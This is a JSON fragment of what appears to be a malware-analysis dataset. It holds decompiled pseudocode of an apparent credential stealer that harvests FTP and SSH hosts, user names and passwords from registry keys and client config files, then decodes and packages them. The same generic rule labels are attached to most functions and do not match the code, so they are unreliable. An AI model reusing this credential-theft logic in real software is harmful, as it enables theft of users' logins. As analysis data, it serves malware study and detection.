            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d072(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *arg_8h_00;\n    uint var_830h;\n    int32_t var_82ch;\n    int32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_10h = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_810h, &var_10h, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            var_814h = fcn.00401df8(uVar2, &var_810h);\n            fcn.004018b8(uVar2);\n            var_828h = fcn.00401d71(arg_ch, var_814h, 0x416817, &var_ch);\n            var_818h = fcn.00401d71(arg_ch, var_814h, \"ServerName\", 0);\n            var_81ch = fcn.00401d71(arg_ch, var_814h, 0x41682b, 0);\n            arg_8h_00 = fcn.00401d71(arg_ch, var_814h, 0x416843, &var_82ch);\n            if ((arg_8h_00 == NULL) || (var_82ch != 4)) {\n                if (arg_8h_00 != NULL) {\n                    fcn.004018b8(arg_8h_00);\n                }\n                var_820h = 0x15;\n            }\n            else {\n                var_820h = *arg_8h_00;\n                fcn.004018b8(arg_8h_00);\n            }\n            var_824h = fcn.00401d71(arg_ch, var_814h, \"InitialDirectory\", 0);\n            uVar2 = fcn.00401d71(arg_ch, var_814h, \"ServerType\", 0);\n            if (var_828h != 0) {\n                iVar1 = fcn.004043dc(var_828h, &var_ch, 0x416859);\n                if ((((iVar1 != 0) && (var_ch != 0)) && (var_81ch != 0)) && (var_818h != 0)) {\n                    fcn.00401569(arg_8h, 0xbeef0010);\n                    fcn.004015cb(arg_8h, var_818h);\n                    fcn.004015cb(arg_8h, var_81ch);\n                    fcn.0040159f(arg_8h, var_828h, var_ch);\n                    fcn.00401569(arg_8h, var_820h);\n                    fcn.004015cb(arg_8h, var_824h);\n                    fcn.004015cb(arg_8h, uVar2);\n                }\n            }\n            fcn.004018b8(var_828h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_824h);\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(uVar2);\n            fcn.0040d072(arg_8h, arg_ch, var_814h);\n            fcn.004018b8(var_814h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 944
    },
    "0040d2cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d2cb(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *arg_8h_00;\n    int32_t arg_ch_00;\n    uint arg_8h_01;\n    uint var_1ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00401d71(arg_ch, \"SOFTWARE\\\\Robo-FTP 3.7\\\\Scripts\", \"FTP Count\", &var_4h);\n    if (arg_8h_00 != NULL) {\n        if (var_4h == 4) {\n            var_8h = *arg_8h_00;\n            if (500 < var_8h) {\n                var_8h = 500;\n            }\n            for (; var_8h != 0; var_8h = var_8h - 1) {\n                fcn.004107ae(&var_1ch, \"FTP File%d\", var_8h);\n                arg_ch_00 = fcn.00401d71(arg_ch, \"SOFTWARE\\\\Robo-FTP 3.7\\\\Scripts\", &var_1ch, 0);\n                if (arg_ch_00 != 0) {\n                    arg_8h_01 = arg_8h;\n                    fcn.0040406c(arg_8h, arg_ch_00, 0xbeef0001);\n                    fcn.004018b8(arg_8h_01);\n                }\n            }\n        }\n        fcn.004018b8(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "0040d3be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d3be(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x48, 0);\n    if ((((((*0x414b47 != NULL) && (*0x414b4b != NULL)) && (*0x414b53 != NULL)) &&\n         ((*0x414b13 != NULL && (*0x414b17 != NULL)))) &&\n        ((*0x414b1b != NULL && ((*0x414b1f != NULL && (*0x414b4f != NULL)))))) &&\n       (var_8h = (**0x414b47)(0, 0x416871),  var_8h != 0)) {\n        iVar2 = 0;\n        while (iVar2 = (**0x414b4b)(var_8h, iVar2),  iVar2 != 0) {\n            var_ch = *(*(iVar2 + 0xc) + 0x68);\n            puVar3 = *(*(iVar2 + 0xc) + 0x6c);\n            if (puVar3 != NULL) {\n                for (; var_ch != 0; var_ch = var_ch + -1) {\n                    iVar1 = fcn.004106ee(*puVar3, \"2.5.29.37\");\n                    if ((iVar1 == 0) && (puVar3[2] != 0)) {\n                        var_10h = fcn.004018cf(puVar3[2]);\n                        fcn.00401906(puVar3[3], var_10h, puVar3[2]);\n                        iVar1 = fcn.004106ee(var_10h, 0x41687e);\n                        if ((iVar1 == 0) && (iVar1 = (**0x414b53)(iVar2, 0, 0, &var_14h, &var_18h, 0),  iVar1 != 0)) {\n                            iVar1 = (**0x414b13)(var_14h, var_18h, &var_1ch);\n                            if (iVar1 != 0) {\n                                iVar1 = (**0x414b17)(var_1ch, 0, 7, 0, 0, &var_20h);\n                                if (iVar1 != 0) {\n                                    arg_ch = fcn.004018cf(var_20h);\n                                    iVar1 = (**0x414b17)(var_1ch, 0, 7, 0, arg_ch, &var_20h);\n                                    if (iVar1 != 0) {\n                                        fcn.00401569(arg_8h, 0xbeef0000);\n                                        fcn.0040159f(arg_8h, *(iVar2 + 4), *(iVar2 + 8));\n                                        fcn.0040159f(arg_8h, arg_ch, var_20h);\n                                    }\n                                    fcn.004018b8(arg_ch);\n                                }\n                                (**0x414b1b)(var_1ch);\n                            }\n                            (**0x414b1f)(var_14h, 0);\n                        }\n                        fcn.004018b8(var_10h);\n                    }\n                    puVar3 = puVar3 + 4;\n                }\n            }\n        }\n        (**0x414b4f)(var_8h, 0);\n    }\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 858
    },
    "0040d5c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d5c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    uint arg_ch_03;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_ch, 0x414845);\n            arg_ch_00 = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            uVar2 = fcn.00401d71(*0x414869, arg_ch_00, \"Host\", 0);\n            iVar1 = fcn.00401d71(*0x414869, arg_ch_00, \"User\", 0);\n            arg_ch_01 = fcn.00401d71(*0x414869, arg_ch_00, \"Pass\", 0);\n            arg_ch_02 = fcn.00401d71(*0x414869, arg_ch_00, 0x4168b9, 0);\n            arg_ch_03 = fcn.00401d71(*0x414869, arg_ch_00, \"Remote Dir\", 0);\n            if (iVar1 != 0) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, uVar2);\n                fcn.004015cb(arg_8h, iVar1);\n                fcn.004015cb(arg_8h, arg_ch_01);\n                fcn.004015cb(arg_8h, arg_ch_02);\n                fcn.004015cb(arg_8h, arg_ch_03);\n            }\n            fcn.0040d5c0(arg_8h, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            fcn.004018b8(uVar2);\n            fcn.004018b8(iVar1);\n            fcn.004018b8(arg_ch_01);\n            fcn.004018b8(arg_ch_02);\n            fcn.004018b8(arg_ch_03);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 703
    },
    "0040d854": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d854(uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    char *arg_ch_00;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    char *arg_10h;\n    uint var_29h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00401f36(arg_ch);\n    if (iVar3 == 0) {\n        return;\n    }\n    iVar3 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar3 != 0) {\n        arg_ch_00 = fcn.004018cf(var_4h);\n        fcn.00401906(var_8h, arg_ch_00, var_4h);\n        arg_10h = arg_ch_00;\n        while ((*arg_10h != '\\0' && (iVar3 = fcn.0041081a(arg_10h, \"<setting name=\\\"\"),  iVar3 != 0))) {\n            iVar4 = fcn.0041066a(\"<setting name=\\\"\");\n            iVar3 = iVar3 + iVar4;\n            puVar5 = fcn.0041081a(iVar3, 0x4168f6);\n            if (puVar5 == NULL) break;\n            uVar1 = *puVar5;\n            iVar4 = fcn.0041081a(iVar3, \"value=\\\"\");\n            if (iVar4 == 0) break;\n            iVar6 = fcn.0041066a(\"value=\\\"\");\n            arg_10h = iVar4 + iVar6;\n            puVar7 = fcn.0041081a(arg_10h, 0x4168f6);\n            if (puVar7 == NULL) break;\n            uVar2 = *puVar7;\n            *puVar5 = 0;\n            *puVar7 = 0;\n            fcn.0040d7c7(arg_8h, iVar3, arg_10h);\n            *puVar5 = uVar1;\n            *puVar7 = uVar2;\n        }\n        fcn.004018b8(arg_ch_00);\n        fcn.00402091(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 560
    },
    "0040d9fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d9fa(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_8h, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            arg_ch_00 = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            var_810h = fcn.00401d71(arg_8h, arg_ch_00, \"HostName\", 0);\n            var_814h = fcn.00401d71(arg_8h, arg_ch_00, \"UserName\", 0);\n            var_818h = fcn.00401d71(arg_8h, arg_ch_00, \"Password\", 0);\n            var_81ch = fcn.00401d71(arg_8h, arg_ch_00, \"PortNumber\", &var_824h);\n            var_820h = fcn.00401d71(arg_8h, arg_ch_00, \"TerminalType\", 0);\n            if (((var_810h != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_10h, 0xbeef0000);\n                fcn.004015cb(arg_10h, var_810h);\n                fcn.004015cb(arg_10h, var_814h);\n                fcn.004015cb(arg_10h, var_818h);\n                fcn.0040159f(arg_10h, var_81ch, var_824h);\n                fcn.004015cb(arg_10h, var_820h);\n            }\n            fcn.0040d9fa(arg_8h, arg_ch_00, arg_10h);\n            fcn.004018b8(arg_ch_00);\n            fcn.004018b8(var_810h);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_820h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 745
    },
    "0040dc62": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dc62(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t var_830h;\n    uint var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_8h, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_828h = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            var_810h = fcn.00401d71(arg_8h, var_828h, \"FTP destination server\", 0);\n            var_814h = fcn.00401d71(arg_8h, var_828h, \"FTP destination user\", 0);\n            var_818h = fcn.00401d71(arg_8h, var_828h, \"FTP destination password\", 0);\n            var_81ch = fcn.00401d71(arg_8h, var_828h, \"FTP destination port\", &var_824h);\n            var_820h = fcn.00401d71(arg_8h, var_828h, \"FTP destination catalog\", 0);\n            var_82ch = fcn.00401d71(arg_8h, var_828h, \"FTP profiles\", &var_830h);\n            if (((var_810h != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_10h, 0xbeef0000);\n                fcn.004015cb(arg_10h, var_810h);\n                fcn.004015cb(arg_10h, var_814h);\n                fcn.004015cb(arg_10h, var_818h);\n                fcn.0040159f(arg_10h, var_81ch, var_824h);\n                fcn.004015cb(arg_10h, var_820h);\n            }\n            if (var_830h != 0) {\n                fcn.00401569(arg_10h, 0xbeef0001);\n                fcn.0040159f(arg_10h, var_82ch, var_830h);\n            }\n            fcn.0040dc62(arg_8h, var_828h, arg_10h);\n            fcn.004018b8(var_828h);\n            fcn.004018b8(var_810h);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_820h);\n            fcn.004018b8(var_82ch);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 862
    },
    "0040dee4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dee4(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x4e, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"ftpshell.fsi\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 445
    },
    "0040dfd1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dfd1(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x50, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"ftpsite.ini\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 444
    },
    "0040e04f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e04f(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x51, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"FTPList.db\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 444
    },
    "0040e0fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e0fe(uchar *arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    ulong uVar7;\n    uint in_stack_ffffff64;\n    uchar *in_stack_ffffff68;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *var_18h;\n    char *var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401f36(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar2 != 0) {\n        var_14h = fcn.004018cf(var_4h);\n        fcn.00401906(var_8h, var_14h, var_4h);\n        pcVar6 = var_14h;\n        while ((*pcVar6 != '\\0' && (iVar2 = fcn.0041081a(pcVar6, \"winex=\\\"\"),  iVar2 != 0))) {\n            iVar3 = fcn.0041066a(\"winex=\\\"\");\n            pcVar6 = iVar2 + iVar3;\n            var_18h = pcVar6;\n            uVar7 = fcn.0041081a(pcVar6, 0x416b28);\n            puVar4 = uVar7;\n            if (puVar4 == NULL) break;\n            uVar1 = *puVar4;\n            *puVar4 = 0;\n            uVar5 = fcn.0041066a(var_18h, uVar7 >> 0x20 & 0xffffff00 | uVar1, puVar4);\n            if (uVar5 != 0) {\n                var_1ch = uVar5;\n                in_stack_ffffff64 = fcn.00402a1d(var_18h);\n                iVar2 = fcn.00402b0d(in_stack_ffffff64, var_1ch);\n                if (iVar2 != 0) {\n                    var_1ch = var_1ch >> 1;\n                    iVar2 = fcn.004043dc(in_stack_ffffff64, &var_1ch, 0);\n                    if (iVar2 != 0) {\n                        fcn.00401569(arg_8h, 0xbeef0001);\n                        fcn.004015cb(arg_8h, var_18h);\n                        in_stack_ffffff68 = arg_8h;\n                        fcn.0040159f(arg_8h, in_stack_ffffff64, var_1ch);\n                    }\n                }\n                fcn.004018b8(in_stack_ffffff64);\n            }\n            *in_stack_ffffff68 = in_stack_ffffff64;\n        }\n        fcn.00401569(arg_8h, 0xbeef0002);\n        fcn.0040159f(arg_8h, var_14h, var_4h);\n        fcn.004018b8(var_14h);\n        fcn.00402091(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 737
    },
    "0040e237": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e237(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_8h, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = fcn.00401d71(arg_8h, arg_ch, \"Site\", 0);\n        var_ch = fcn.00401d71(arg_8h, arg_ch, \"UserID\", 0);\n        var_10h = fcn.00401d71(arg_8h, arg_ch, \"xflags\", &var_1ch);\n        var_14h = fcn.00401d71(arg_8h, arg_ch, \"Port\", 0);\n        var_18h = fcn.00401d71(arg_8h, arg_ch, \"Folder\", 0);\n        if ((var_10h != 0) && (var_1ch != 0)) {\n            iVar1 = fcn.00402b0d(var_10h, var_1ch);\n            if (iVar1 != 0) {\n                var_1ch = var_1ch >> 1;\n                iVar1 = fcn.004043dc(var_10h, &var_1ch, 0);\n                if ((((iVar1 != 0) && (var_8h != 0)) && (var_ch != 0)) && (var_10h != 0)) {\n                    fcn.00401569(arg_10h, 0xbeef0000);\n                    fcn.004015cb(arg_10h, var_8h);\n                    fcn.004015cb(arg_10h, var_ch);\n                    fcn.0040159f(arg_10h, var_10h, var_1ch);\n                    fcn.004015cb(arg_10h, var_14h);\n                    fcn.004015cb(arg_10h, var_18h);\n                }\n            }\n        }\n        fcn.004018b8(var_8h);\n        fcn.004018b8(var_ch);\n        fcn.004018b8(var_10h);\n        fcn.004018b8(var_14h);\n        fcn.004018b8(var_18h);\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 589
    },
    "0040e380": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e380(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_8h, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107ea();\n            if (iVar1 != 0) break;\n            if (var_814h == 1) {\n                iVar1 = fcn.00401d71(arg_8h, arg_ch, &var_80ch, &var_818h);\n                if (iVar1 != 0) {\n                    var_810h = iVar1;\n                    iVar1 = fcn.00410808(iVar1, \".wjf\");\n                    if (iVar1 != 0) {\n                        fcn.0040e0fe(arg_10h, var_810h);\n                    }\n                    fcn.004018b8(var_810h);\n                }\n                var_8h = var_8h + 1;\n            }\n            else {\n                var_8h = var_8h + 1;\n            }\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 353
    },
    "0040e4e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e4e8(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x55, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"project.ini\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 444
    },
    "0040e566": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
